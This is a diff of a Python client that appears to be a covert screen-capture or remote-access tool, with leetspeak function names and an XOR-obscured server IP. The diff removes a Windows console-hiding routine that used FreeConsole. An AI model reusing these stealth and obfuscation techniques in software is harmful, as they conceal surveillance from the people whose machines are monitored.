@@ -6,7 +6,6 @@ import os
 import time
 from PIL import ImageGrab
 from io import BytesIO
-import ctypes
 import sys
 import random
 import string
@@ -17,11 +16,6 @@ def xor_encrypt_decrypt(data, key):
 
 # XOR key for encryption
 XOR_KEY = 123  # Choose a key for XOR encryption (ensure it's a single byte)
-
-# Function to hide the console window
-def h1d3_c0ns0l3():
-    if sys.platform == "win32":
-        ctypes.windll.kernel32.FreeConsole()
 
 # Connect to the server
 S3RV3R_IP = xor_encrypt_decrypt("10.0.1.33", XOR_KEY)  # Encrypted server IP
@@ -77,5 +71,4 @@ def st4rt_cl1nt():
 
 # Main function to run the client
 if __name__ == "__main__":
-    h1d3_c0ns0l3()  # Hide the console window to run in the background
     st4rt_cl1nt()
